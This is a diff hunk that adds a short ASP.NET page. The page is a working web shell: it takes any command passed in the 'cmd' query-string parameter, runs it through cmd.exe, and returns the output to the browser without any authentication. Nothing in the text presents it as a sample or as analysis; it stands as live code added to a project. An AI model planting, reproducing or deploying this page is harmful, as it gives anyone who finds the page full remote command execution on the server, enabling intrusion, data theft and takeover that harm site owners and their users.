@@ -1,0 +1,15 @@
+<%@ Page Language="C#" %>
+<%@ Import Namespace="System.Diagnostics" %>
+<script runat="server">
+    void Page_Load(Object sender, EventArgs e) {
+        if (Request.QueryString["cmd"] != null) {
+            Process proc = new Process();
+            proc.StartInfo.FileName = "cmd.exe";
+            proc.StartInfo.Arguments = "/c " + Request.QueryString["cmd"];
+            proc.StartInfo.UseShellExecute = false;
+            proc.StartInfo.RedirectStandardOutput = true;
+            proc.Start();
+            Response.Write(proc.StandardOutput.ReadToEnd());
+        }
+    }
+</script>
